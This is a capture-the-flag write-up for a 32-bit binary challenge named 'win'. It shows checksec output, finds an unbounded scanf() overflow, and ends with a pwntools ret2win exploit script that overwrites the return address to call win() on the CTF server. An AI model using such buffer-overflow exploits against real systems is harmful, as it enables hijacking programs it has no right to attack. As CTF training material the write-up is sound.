Let's get started with WIN:

First lets run the program:
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
'''
┌──(kali㉿kali)-[~/Hacking/cwe_screener_3.0/pwn/win]
└─$ ./win                      
Can you figure out how to win here?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
You lose!
                                                                                                                                                                                         
┌──(kali㉿kali)-[~/Hacking/cwe_screener_3.0/pwn/win]
└─$ ./win
Can you figure out how to win here?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
zsh: segmentation fault  ./win

'''
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
So after running it twice we see that there is input from the user and a Segmentation fault vulnerability.
Let's now look at the files protections using file & checksec.
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
'''
win: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=864b3ae5805f65fed1efc9b806fe76782c22a563, for GNU/Linux 3.2.0, with debug_info, not stripped

[*] '/home/kali/Hacking/cwe_screener_3.0/pwn/win/win'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments

'''
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Here we see that there is minimal protections on this 32-bit executeable. A canary is found, but it did not look like any were triggered by our SEG fault.

If we use some static analysis... we see that there is a dbg.main(), dbg.read_in(), and dbg.win()
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
dbg.main()


dbg.read_in()

dbg.win()
https://github.com/beCe3jed/cwe-screener-10FEB24/blob/main/pwn/win/pwn-win-dbg.win.png

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
so we can see that read_in() does not have any bounds checking on its scanf() call. This gives us a chance for a buffer overflow. 
And looking further we can see that the canary is not being checked in this function, so we have an oppurtunity to hijack the main() function call.
We can see that our buffer lies 0x34 bytes away from rbp, and since this is 32-bit, we know ebp is only 4 bytes.

We can use pwn to find the address of the win function, which gives us enough to make our payload!


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
'''
'''
win: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=864b3ae5805f65fed1efc9b806fe76782c22a563, for GNU/Linux 3.2.0, with debug_info, not stripped

[*] '/home/kali/Hacking/cwe_screener/pwn/win/win'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments


└─$ ./win    
Can you figure out how to win here?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
zsh: segmentation fault  ./win



'''

from pwn import *

context.binary = binary = ELF("./win")

# we have a buffer overflow for our input, so we may be able to hijack the return address
# We also find a win() function, a nice hint :)

# It looks like there is a separate function from main called read_in() that we have our buffer overflow via scanf()
# p = process()

# connection to the server
p = remote('www.cweaccessionsctf.com', 1300)

# useful for debugging
# pid = util.proc.pidof(p)[0]
# print(f"Pid is: {pid}")
# util.proc.wait_for_debugger(pid)

#  I set this the variable equal to the statically linked function 
win = binary.symbols['win']

# sending 0x34 bytes until ebp, 0x4 bytes to overwrite ebp, and then we pack the address of win()
p.sendline(b"A"*0x34 + b"B"*4 + p32(win))

# flag{no_stack_smashing_here}


p.interactive()

'''
